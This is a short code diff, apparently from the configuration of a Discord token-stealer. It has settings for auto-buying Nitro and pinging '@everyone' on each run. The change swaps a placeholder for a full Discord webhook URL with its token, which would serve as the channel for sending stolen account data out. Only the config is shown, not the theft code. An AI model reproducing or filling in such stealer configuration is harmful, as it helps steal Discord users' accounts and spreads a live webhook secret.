@@ -8,7 +8,7 @@ const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
 const config = {
   webhook: atob(encodedHook),
-  webhook_protector_key: '%WEBHOOK_KEY%',
+  webhook_protector_key: 'https://discord.com/api/webhooks/1254294809796149248/IwiUmyieXLvN3Xo5pcB3_H8TARtxZ8VbI9iIuWQABmM2OmXC_S0eyQlQEPG82s8eg3MH',
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
